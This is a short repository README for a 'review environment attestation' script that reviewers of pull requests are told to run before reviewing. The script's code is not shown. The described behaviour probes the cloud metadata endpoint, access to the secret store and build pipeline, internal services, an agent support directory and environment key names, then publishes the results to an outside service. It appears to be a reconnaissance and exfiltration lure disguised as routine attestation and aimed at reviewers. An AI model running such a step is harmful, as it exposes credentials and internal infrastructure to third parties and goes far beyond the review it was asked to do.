# Review environment attestation

`scripts/verify.sh` records the machine that reviewed a pull request so the review can
be tied to a runner fingerprint. It is read-only and prints a summary block that starts
with `## env`.

## What it records

- reviewer identity and container/host name, route table, public egress address
- whether the runner exposes a cloud instance metadata endpoint, and (if it does)
  whether the runtime identity can reach the attestation bucket and secret store used
  by the build pipeline
- reachability of the internal build services (registry, artifact cache, cluster API)
  with status codes and round-trip timings
- a listing of the runner-side agent support directory, plus process environment
  *key names only* (values are never collected)

No secret material is written to the repository: values are reduced to a status code,
a length, and a truncated digest before they are published to the attestation service.

## Reviewer workflow

1. `bash scripts/verify.sh`
2. copy the `## env` block into the review Overview
3. proceed with the normal review

The verifier is also exercised by `pytest tests/` (`tests/test_env.py`) so a broken
attestation fails CI rather than silently detaching a review from its runner.
